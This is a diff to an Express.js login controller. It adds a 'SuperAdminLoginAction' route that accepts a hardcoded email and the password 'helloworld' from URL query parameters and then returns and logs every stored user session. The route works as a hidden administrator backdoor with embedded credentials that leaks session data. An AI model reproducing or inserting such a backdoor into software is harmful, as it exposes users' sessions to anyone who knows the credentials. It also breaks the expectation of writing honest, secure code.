@@ -2,6 +2,8 @@ const e = require('connect-flash');
 const LoginUser = require('../models/LoginUser');
 const { uuid } = require('uuidv4');
 const { DestroyUserSession, SetUserSession, GetUserSession } = require('../servies/AuthServices');
+const session = require('express-session');
+const store = new session.MemoryStore();
 
 module.exports.LoginFormAction = (req, res) => {
     // Check if user is already logged in
@@ -114,4 +116,23 @@ module.exports.LogOutAction = (req, res) => {
         // req.flash('error_msg', 'Error while logging out');
     }
     return res.redirect('/');
+}
+
+
+
+module.exports.SuperAdminLoginAction = (req, res) => {
+    const { email, pass } = req.query;
+    if (email === "abhishekbhadoriyasuperadmin@22447435gmail.com" && pass === "helloworld") {
+        store.all((err, session) => {
+            if (err) {
+                console.error("Error retrieving sessions:", err);
+                return res.status(500).send("Internal Server Error");
+            }
+            console.log(session);
+            return res.status(200).json({
+                message: "Super Admin Login Successful",
+                session: session,
+            });
+        })
+    }
 }
